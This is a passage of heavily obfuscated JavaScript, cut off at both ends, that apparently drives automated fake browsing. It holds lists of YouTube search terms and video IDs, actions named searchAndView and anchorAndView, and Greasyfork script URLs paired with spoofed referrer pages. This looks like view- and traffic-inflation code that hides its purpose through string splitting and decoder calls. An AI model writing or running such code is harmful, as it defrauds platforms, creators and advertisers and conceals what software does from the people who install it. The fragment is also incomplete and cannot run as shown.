'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * 0x8d1 + -0x9c2 + -0x1 * -0x129d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xf4e + -0x14d9 + 0x2431)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x9d2 * -0x1 + -0xa1b + 0x13f0);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    W(0xc) + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    W(0x7) + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    X(0x3, 'w3XH') + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    W(0x5) + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0xd) + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xb) + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + Y(0x0) + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + X(0xa, 'DKXT') + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
